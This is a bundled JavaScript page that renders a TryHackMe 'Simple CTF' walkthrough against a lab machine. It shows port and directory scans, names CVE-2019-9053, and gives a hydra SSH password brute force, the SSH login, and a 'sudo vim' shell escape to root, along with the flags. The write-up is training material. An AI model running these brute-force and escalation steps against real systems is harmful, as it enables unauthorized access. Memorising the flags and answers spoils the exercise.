"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2082],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>m});var i=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,i,o=function(e,t){if(null==e)return{};var n,i,o={},r=Object.keys(e);for(i=0;i<r.length;i++)n=r[i],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(i=0;i<r.length;i++)n=r[i],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=i.createContext({}),c=function(e){var t=i.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},p=function(e){var t=c(e.components);return i.createElement(l.Provider,{value:t},e.children)},h="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return i.createElement(i.Fragment,{},t)}},u=i.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),h=c(n),u=o,m=h["".concat(l,".").concat(u)]||h[u]||d[u]||r;return n?i.createElement(m,a(a({ref:t},p),{},{components:n})):i.createElement(m,a({ref:t},p))}));function m(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,a=new Array(r);a[0]=u;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[h]="string"==typeof e?e:o,a[1]=s;for(var c=2;c<r;c++)a[c]=n[c];return i.createElement.apply(null,a)}return i.createElement.apply(null,n)}u.displayName="MDXCreateElement"},18236:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>a,default:()=>d,frontMatter:()=>r,metadata:()=>s,toc:()=>c});var i=n(87462),o=(n(67294),n(3905));const r={},a="Simple CTF",s={unversionedId:"Tryhackme/Simple CTF/Simple CTF",id:"Tryhackme/Simple CTF/Simple CTF",title:"Simple CTF",description:"Beginner level ctf",source:"@site/writeups/Tryhackme/Simple CTF/Simple CTF.md",sourceDirName:"Tryhackme/Simple CTF",slug:"/Tryhackme/Simple CTF/",permalink:"/writeups/Tryhackme/Simple CTF/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Shodan.io",permalink:"/writeups/Tryhackme/Shodan.io/Shodan"},next:{title:"Skynet",permalink:"/writeups/Tryhackme/Skynet/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Simple CTF",id:"simple-ctf-1",level:2}],p={toc:c},h="wrapper";function d(e){let{components:t,...n}=e;return(0,o.kt)(h,(0,i.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"simple-ctf"},"Simple CTF"),(0,o.kt)("p",null,"Beginner level ctf"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/easyctf"},"Simple CTF")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"CVE-2019-9053 - CMS Made Simple < 2.2.10"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (SSH)"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,o.kt)("h2",{id:"simple-ctf-1"},"Simple CTF"),(0,o.kt)("p",null,"Deploy the machine and attempt the questions!"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Simple CTF$ nikto -h http://10.10.158.205/\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.158.205\n+ Target Hostname:    10.10.158.205\n+ Target Port:        80\n+ Start Time:         2020-10-04 20:47:22 (GMT2)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.18 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ \"robots.txt\" contains 2 entries which should be manually viewed.\n+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 590523e6dfcd7, mtime: gzip\n+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.\n+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS \n+ OSVDB-3233: /icons/README: Apache default file found.\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"How many services are running under port 1000?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Simple CTF$ sudo nmap -A -sC -sV -sS -O 10.10.158.205\n[sudo] password for kali: \nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 20:43 CEST\nNmap scan report for 10.10.158.205\nHost is up (0.094s latency).\nNot shown: 997 filtered ports\nPORT     STATE  SERVICE VERSION\n21/tcp   open   ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_Can't get directory listing: TIMEOUT\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n80/tcp   closed http\n2222/tcp open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)\n|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)\n|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)\nDevice type: storage-misc|general purpose|WAP\nRunning (JUST GUESSING): HP embedded (87%), Linux 2.6.X|3.X (86%), Ubiquiti embedded (86%), Ubiquiti AirOS 5.X (86%)\nOS CPE: cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/h:ubnt:airmax_nanostation cpe:/o:ubnt:airos:5.2.6\nAggressive OS guesses: HP P2000 G3 NAS device (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (86%), Linux 3.7 (86%), Linux 2.6.32 - 3.13 (86%), Linux 3.0 - 3.2 (86%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (86%), Ubiquiti AirOS 5.5.9 (85%), Linux 3.3 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   39.03 ms  10.8.0.1\n2   105.55 ms 10.10.158.205\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 51.04 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"2")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What is running on the higher port?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SSH")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"What's the CVE you're using against the application?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Simple CTF$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.158.205/\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.158.205/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/04 20:46:58 Starting gobuster\n===============================================================\n/simple (Status: 301)\nProgress: 79243 / 220561 (35.93%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/04 20:54:11 Finished\n===============================================================\n")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://www.exploit-db.com/exploits/46635"},"CMS Made Simple < 2.2.10 - SQL Injection"))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"CVE-2019-9053")),(0,o.kt)("ol",{start:6},(0,o.kt)("li",{parentName:"ol"},"To what kind of vulnerability is the application vulnerable?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SQLi")),(0,o.kt)("ol",{start:7},(0,o.kt)("li",{parentName:"ol"},"What's the password?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Simple CTF$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.158.205 -s 2222 -Vv ssh\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 21:04:05\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://10.10.158.205:2222/\n[VERBOSE] Resolving addresses ... [VERBOSE] resolving done\n[INFO] Testing if password authentication is supported by ssh://mitch@10.10.158.205:2222\n[INFO] Successful, password authentication is supported by ssh://10.10.158.205:2222\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "123456" - 1 of 14344399 [child 0] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "12345" - 2 of 14344399 [child 1] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "123456789" - 3 of 14344399 [child 2] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "password" - 4 of 14344399 [child 3] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "princess" - 6 of 14344399 [child 5] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "1234567" - 7 of 14344399 [child 6] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "12345678" - 9 of 14344399 [child 8] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "abc123" - 10 of 14344399 [child 9] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "nicole" - 11 of 14344399 [child 10] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "daniel" - 12 of 14344399 [child 11] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "monkey" - 14 of 14344399 [child 13] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "lovely" - 15 of 14344399 [child 14] (0/0)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "jessica" - 16 of 14344399 [child 15] (0/0)\n[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer\n[ERROR] ssh protocol error\n[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer\n[ERROR] ssh protocol error\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "654321" - 17 of 14344401 [child 2] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "michael" - 18 of 14344401 [child 13] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "ashley" - 19 of 14344401 [child 12] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "qwerty" - 20 of 14344401 [child 0] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "111111" - 21 of 14344401 [child 1] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "iloveu" - 22 of 14344401 [child 3] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "000000" - 23 of 14344401 [child 6] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "michelle" - 24 of 14344401 [child 8] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "tigger" - 25 of 14344401 [child 11] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "sunshine" - 26 of 14344401 [child 14] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "chocolate" - 27 of 14344401 [child 2] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "password1" - 28 of 14344401 [child 4] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "soccer" - 29 of 14344401 [child 5] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "anthony" - 30 of 14344401 [child 7] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "friends" - 31 of 14344401 [child 9] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "butterfly" - 32 of 14344401 [child 10] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "purple" - 33 of 14344401 [child 13] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "angel" - 34 of 14344401 [child 15] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "jordan" - 35 of 14344401 [child 12] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "liverpool" - 36 of 14344401 [child 15] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "justin" - 37 of 14344401 [child 9] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "loveme" - 38 of 14344401 [child 14] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "fuckyou" - 39 of 14344401 [child 0] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "123123" - 40 of 14344401 [child 4] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "football" - 41 of 14344401 [child 13] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "secret" - 42 of 14344401 [child 2] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "andrea" - 43 of 14344401 [child 3] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "carlos" - 44 of 14344401 [child 5] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "jennifer" - 45 of 14344401 [child 7] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "joshua" - 46 of 14344401 [child 8] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "bubbles" - 47 of 14344401 [child 1] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "1234567890" - 48 of 14344401 [child 6] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "superman" - 49 of 14344401 [child 10] (0/2)\n[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "hannah" - 50 of 14344401 [child 11] (0/2)\n[2222][ssh] host: 10.10.158.205   login: mitch   password: secret\n[STATUS] attack finished for 10.10.158.205 (waiting for children to complete tests)\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 2 final worker threads did not complete until end.\n[ERROR] 2 targets did not resolve or could not be connected\n[ERROR] 0 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-04 21:04:18\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"[2222][ssh] host: 10.10.158.205   login: mitch   password: secret")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"secret")),(0,o.kt)("ol",{start:9},(0,o.kt)("li",{parentName:"ol"},"Where can you login with the details obtained?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Simple CTF$ ssh mitch@10.10.158.205 -p 2222\nThe authenticity of host '[10.10.158.205]:2222 ([10.10.158.205]:2222)' can't be established.\nECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '[10.10.158.205]:2222' (ECDSA) to the list of known hosts.\nmitch@10.10.158.205's password: \nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n0 packages can be updated.\n0 updates are security updates.\n\nLast login: Mon Aug 19 18:13:41 2019 from 192.168.0.190\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SSH")),(0,o.kt)("ol",{start:10},(0,o.kt)("li",{parentName:"ol"},"What's the user flag?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ whoami\nmitch\n$ ls\nuser.txt\n$ cat user.txt\nG00d j0b, keep up!\n$ \n")),(0,o.kt)("ol",{start:12},(0,o.kt)("li",{parentName:"ol"},"Is there any other user in the home directory? What's its name?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ ls /home\nmitch  sunbath\n$\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"sunbath")),(0,o.kt)("ol",{start:13},(0,o.kt)("li",{parentName:"ol"},"What can you leverage to spawn a privileged shell?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo -l\nUser mitch may run the following commands on Machine:\n    (root) NOPASSWD: /usr/bin/vim\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"vim")),(0,o.kt)("ol",{start:14},(0,o.kt)("li",{parentName:"ol"},"What's the root flag?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo vim -c ':!/bin/sh'\n\n# cd /root\n# ls\nroot.txt\n# cat root.txt\nW3ll d0n3. You made it!\n# \n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"W3ll d0n3. You made it!")))}d.isMDXComponent=!0}}]);